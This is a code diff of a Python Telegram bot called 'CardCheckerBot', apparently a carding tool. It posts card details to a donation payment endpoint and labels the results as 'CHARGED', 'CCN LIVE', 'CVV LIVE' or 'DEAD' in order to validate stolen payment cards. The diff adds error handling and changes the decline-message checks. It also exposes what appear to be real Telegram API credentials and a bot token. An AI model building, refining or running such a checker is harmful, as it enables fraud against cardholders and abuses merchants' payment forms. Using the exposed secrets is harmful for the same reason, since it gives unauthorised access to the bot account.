@@ -4,10 +4,10 @@ from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery
 
 # Bot Configuration
-API_ID = "28271744"
-API_HASH = "1df4d2b4dc77dc5fd65622f9d8f6814d"
-BOT_TOKEN = "7393878224:AAGTFjEclUdXYI0NzaRUUqmRUwFrNBhYVKo"
-ADMIN_ID = 5429071679  # Replace with the admin's Telegram ID
+API_ID = "28271744"  # Replace with your API_ID
+API_HASH = "1df4d2b4dc77dc5fd65622f9d8f6814d"  # Replace with your API_HASH
+BOT_TOKEN = "7393878224:AAGTFjEclUdXYI0NzaRUUqmRUwFrNBhYVKo"  # Replace with your BOT_TOKEN
+ADMIN_ID = 6653249747  # Replace with the admin's Telegram ID
 
 bot = Client("CardCheckerBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
@@ -58,7 +58,10 @@ def check_card_details(card):
         }
 
         response_2 = requests.post(donation_url, headers=headers_2, data=data_2)
-        result_2 = json.loads(response_2.text)
+        try:
+            result_2 = json.loads(response_2.text)
+        except json.JSONDecodeError:
+            return "DEAD❌\nMessage: Unknown response format\nReason: Parsing Error"
 
         if not result_2.get("res", False):
             error = result_2.get("error", {}).get("error", {})
@@ -67,24 +70,18 @@ def check_card_details(card):
             return f"DEAD❌\nMessage: {decline_message}\nReason: {decline_reason}"
 
         # Key checks
-        if "payment_intent_unexpected_state" in result_2:
-            return "Payment Intent Confirmed✅"
-        elif "succeeded" in result_2:
+        if "succeeded" in result_2:
             return "CHARGED✅"
-        elif "Your card has insufficient funds." in result_2.get("message", ""):
+        elif "insufficient_funds" in result_2.get("message", ""):
             return "INSUFFICIENT FUNDS❎"
-        elif "incorrect_zip" in result_2.get("message", ""):
-            return "CVV LIVE❎"
         elif "security code is incorrect" in result_2.get("message", ""):
             return "CCN LIVE❎"
         elif "Your card's security code is invalid." in result_2.get("message", ""):
             return "CCN LIVE❎"
         elif "transaction_not_allowed" in result_2.get("message", ""):
             return "CVV LIVE❎"
-        elif "stripe_3ds2_fingerprint" in result_2:
+        elif "3d_secure" in result_2.get("message", ""):
             return "3D REQUIRED❎"
-        elif "redirect_url" in result_2:
-            return "Approved❎\n3DS Required"
         else:
             return "DEAD❌"
 
